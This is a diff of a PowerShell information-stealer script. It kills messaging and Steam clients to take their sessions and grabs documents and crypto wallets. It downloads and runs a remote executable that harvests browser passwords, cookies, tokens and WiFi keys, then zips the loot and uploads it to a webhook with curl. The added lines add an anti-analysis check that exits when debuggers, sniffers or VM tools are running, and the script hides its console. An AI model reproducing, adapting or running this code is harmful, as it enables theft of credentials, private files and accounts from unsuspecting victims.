@@ -1,4 +1,6 @@
-$ErrorActionPreference = 'SilentlyContinue'
+﻿$ErrorActionPreference = 'SilentlyContinue' # Igonore all warnings
+$ProgressPreference = 'SilentlyContinue' # Hide all Progresses
+
 function CHECK_IF_ADMIN {
     $test = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator); echo $test
 }
@@ -76,7 +78,7 @@ function EXFILTRATE-DATA {
 	function telegramstealer {
     $processName = "telegram"
     try {
-        if (Get-Process $processName -ErrorAction SilentlyContinue) {
+        if (Get-Process $processName ) {
             Get-Process -Name $processName | Stop-Process
         }
     } catch {
@@ -94,7 +96,7 @@ function EXFILTRATE-DATA {
     function elementstealer {
         $processName = "element"
         try {
-            if (Get-Process $processName -ErrorAction SilentlyContinue) {
+            if (Get-Process $processName ) {
                 Get-Process -Name $processName | Stop-Process
             }
         } catch {
@@ -117,7 +119,7 @@ function EXFILTRATE-DATA {
     function signalstealer {
          $processName = "Signal"
          try {
-             if (Get-Process $processName -ErrorAction SilentlyContinue) {
+             if (Get-Process $processName ) {
                  Get-Process -Name $processName | Stop-Process
              }
          } catch {
@@ -140,7 +142,7 @@ function EXFILTRATE-DATA {
 	 function steamstealer {
          $processName = "steam"
          try {
-             if (Get-Process $processName -ErrorAction SilentlyContinue) {
+             if (Get-Process $processName ) {
                  Get-Process -Name $processName | Stop-Process
              }
          } catch {
@@ -183,7 +185,7 @@ function EXFILTRATE-DATA {
         if ($disk.Size -gt 0) {
             $SizeOfDisk = [math]::round($disk.Size/1GB, 0)
             $FreeSpace = [math]::round($disk.FreeSpace/1GB, 0)
-            $usedspace = [math]::round(($disk.size - $disk.freespace) / 1GB, 2)
+    		$usedspace = [math]::round(($disk.size - $disk.freespace) / 1GB, 2)
             [int]$FreePercent = ($FreeSpace/$SizeOfDisk) * 100
 			[int]$usedpercent = ($usedspace/$SizeOfDisk) * 100
             [PSCustomObject]@{
@@ -333,7 +335,7 @@ function EXFILTRATE-DATA {
     )
     $dest = "$env:localappdata\Temp\Files Grabber"
     $paths = "$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop"
-    [regex] $grab_regex = '(' + (($grabber |foreach {[regex]::escape($_)}) -join "|") + ")"
+    [regex] $grab_regex = "(" + (($grabber |foreach {[regex]::escape($_)}) –join "|") + ")"
     (gci -path $paths -Include "*.pdf","*.txt","*.doc","*.csv","*.rtf","*.docx" -r | ? Length -lt 5mb) -match $grab_regex | Copy-Item -Destination $dest -Force
     }
     GrabFiles
@@ -412,38 +414,38 @@ function EXFILTRATE-DATA {
         New-Item "$env:LOCALAPPDATA\Temp\KDOT" -Type Directory
     }
     
-    $ProgressPreference = "SilentlyContinue";Invoke-WebRequest -Uri "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/V4.1/main.exe" -OutFile "main.exe" -UseBasicParsing
+    Invoke-WebRequest -Uri "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/V4.1/main.exe" -OutFile "main.exe" -UseBasicParsing
 
     $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru
     $proc.WaitForExit()
 
     $extracted = "$env:LOCALAPPDATA\Temp"
-    Move-Item -Path "$extracted\ip.txt" -Destination "$extracted\KDOT\ip.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\netstat.txt" -Destination "$extracted\KDOT\netstat.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\system_info.txt" -Destination "$extracted\KDOT\system_info.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\uuid.txt" -Destination "$extracted\KDOT\uuid.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\mac.txt" -Destination "$extracted\KDOT\mac.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\browser-cookies.txt" -Destination "$extracted\KDOT\browser-cookies.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\browser-history.txt" -Destination "$extracted\KDOT\browser-history.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\browser-passwords.txt" -Destination "$extracted\KDOT\browser-passwords.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\desktop-screenshot.png" -Destination "$extracted\KDOT\desktop-screenshot.png" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\tokens.txt" -Destination "$extracted\KDOT\tokens.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\WIFIPasswords.txt" -Destination "$extracted\KDOT\WIFIPasswords.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\GPU.txt" -Destination "$extracted\KDOT\GPU.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\Installed-Applications.txt" -Destination "$extracted\KDOT\Installed-Applications.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\DiskInfo.txt" -Destination "$extracted\KDOT\DiskInfo.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\CPU.txt" -Destination "$extracted\KDOT\CPU.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\NetworkAdapters.txt" -Destination "$extracted\KDOT\NetworkAdapters.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\ProductKey.txt" -Destination "$extracted\KDOT\ProductKey.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\StartUpApps.txt" -Destination "$extracted\KDOT\StartUpApps.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\running-services.txt" -Destination "$extracted\KDOT\running-services.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\running-applications.txt" -Destination "$extracted\KDOT\running-applications.txt" -ErrorAction SilentlyContinue
-	Move-Item -Path "$extracted\telegram-session.zip" -Destination "$extracted\KDOT\telegram-session.zip" -ErrorAction SilentlyContinue
-	Move-Item -Path "$extracted\element-session.zip" -Destination "$extracted\KDOT\element-session.zip" -ErrorAction SilentlyContinue
-	Move-Item -Path "$extracted\signal-session.zip" -Destination "$extracted\KDOT\signal-session.zip" -ErrorAction SilentlyContinue
-	Move-Item -Path "$extracted\steam-session.zip" -Destination "$extracted\KDOT\steam-session.zip" -ErrorAction SilentlyContinue
-	Move-Item -Path "Files Grabber" -Destination "$extracted\KDOT\Files Grabber" -ErrorAction SilentlyContinue
-	Move-Item -Path "Crypto Wallets" -Destination "$extracted\KDOT\Crypto Wallets" -ErrorAction SilentlyContinue
+    Move-Item -Path "$extracted\ip.txt" -Destination "$extracted\KDOT\ip.txt" 
+    Move-Item -Path "$extracted\netstat.txt" -Destination "$extracted\KDOT\netstat.txt" 
+    Move-Item -Path "$extracted\system_info.txt" -Destination "$extracted\KDOT\system_info.txt" 
+    Move-Item -Path "$extracted\uuid.txt" -Destination "$extracted\KDOT\uuid.txt" 
+    Move-Item -Path "$extracted\mac.txt" -Destination "$extracted\KDOT\mac.txt" 
+    Move-Item -Path "$extracted\browser-cookies.txt" -Destination "$extracted\KDOT\browser-cookies.txt" 
+    Move-Item -Path "$extracted\browser-history.txt" -Destination "$extracted\KDOT\browser-history.txt" 
+    Move-Item -Path "$extracted\browser-passwords.txt" -Destination "$extracted\KDOT\browser-passwords.txt" 
+    Move-Item -Path "$extracted\desktop-screenshot.png" -Destination "$extracted\KDOT\desktop-screenshot.png" 
+    Move-Item -Path "$extracted\tokens.txt" -Destination "$extracted\KDOT\tokens.txt" 
+    Move-Item -Path "$extracted\WIFIPasswords.txt" -Destination "$extracted\KDOT\WIFIPasswords.txt" 
+    Move-Item -Path "$extracted\GPU.txt" -Destination "$extracted\KDOT\GPU.txt" 
+    Move-Item -Path "$extracted\Installed-Applications.txt" -Destination "$extracted\KDOT\Installed-Applications.txt" 
+    Move-Item -Path "$extracted\DiskInfo.txt" -Destination "$extracted\KDOT\DiskInfo.txt" 
+    Move-Item -Path "$extracted\CPU.txt" -Destination "$extracted\KDOT\CPU.txt" 
+    Move-Item -Path "$extracted\NetworkAdapters.txt" -Destination "$extracted\KDOT\NetworkAdapters.txt" 
+    Move-Item -Path "$extracted\ProductKey.txt" -Destination "$extracted\KDOT\ProductKey.txt" 
+    Move-Item -Path "$extracted\StartUpApps.txt" -Destination "$extracted\KDOT\StartUpApps.txt" 
+    Move-Item -Path "$extracted\running-services.txt" -Destination "$extracted\KDOT\running-services.txt" 
+    Move-Item -Path "$extracted\running-applications.txt" -Destination "$extracted\KDOT\running-applications.txt" 
+	Move-Item -Path "$extracted\telegram-session.zip" -Destination "$extracted\KDOT\telegram-session.zip" 
+	Move-Item -Path "$extracted\element-session.zip" -Destination "$extracted\KDOT\element-session.zip" 
+	Move-Item -Path "$extracted\signal-session.zip" -Destination "$extracted\KDOT\signal-session.zip" 
+	Move-Item -Path "$extracted\steam-session.zip" -Destination "$extracted\KDOT\steam-session.zip" 
+	Move-Item -Path "Files Grabber" -Destination "$extracted\KDOT\Files Grabber" 
+	Move-Item -Path "Crypto Wallets" -Destination "$extracted\KDOT\Crypto Wallets" 
     Compress-Archive -Path "$extracted\KDOT" -DestinationPath "$extracted\KDOT.zip" -Force
     curl.exe -X POST -F 'payload_json={\"username\": \"POWERSHELL GRABBER\", \"content\": \"\", \"avatar_url\": \"https://i.postimg.cc/m2SSKrBt/Logo.gif\"}' -F "file=@$extracted\KDOT.zip" $webhook
     Remove-Item "$extracted\KDOT.zip"
@@ -487,6 +489,60 @@ function Request-Admin {
     }
 }
 
+function Invoke-ANTIVM {
+
+ function antivm
+ {
+   "autoruns"
+   "autorunsc"
+   "dumpcap"
+   "Fiddler"
+   "fakenet"
+   "HookExplorer"
+   "ImmunityDebugger"
+   "httpdebugger"
+   "ImportREC"
+   "LordPE"
+   "PETools"
+   "ProcessHacker"
+   "ResourceHacker"
+   "Scylla_x64"
+   "sandman"
+   "SysInspector"
+   "tcpview"
+   "die"
+   "dumpcap"
+   "filemon"
+   "idaq"
+   "idaq64"
+   "joeboxcontrol"
+   "joeboxserver"
+   "ollydbg"
+   "proc_analyzer"
+   "procexp"
+   "procmon"
+   "regmon"
+   "sniff_hit"
+   "sysAnalyzer"
+   "tcpview"
+   "windbg"
+   "Wireshark"
+   "x32dbg"
+   "x64dbg"
+   "Vmwareuser"
+   "Vmacthlp"
+   "vboxservice"
+   "vboxtray"
+ }
+$processnames = antivm
+if(($processnames | ForEach-Object {Get-Process -Name $_ }) -eq $null){ 
+   Invoke-TASKS  
+}
+else{ 
+  exit
+}
+}
+
 function Hide-Console
 {
     if (-not ("Console.Window" -as [type])) { 
@@ -504,7 +560,7 @@ function Hide-Console
 
 if (CHECK_IF_ADMIN -eq $true) {
     Hide-Console
-    Invoke-TASKS
+    Invoke-ANTIVM
     # Self-Destruct
 	# Remove-Item $PSCommandPath -Force 
 } else {
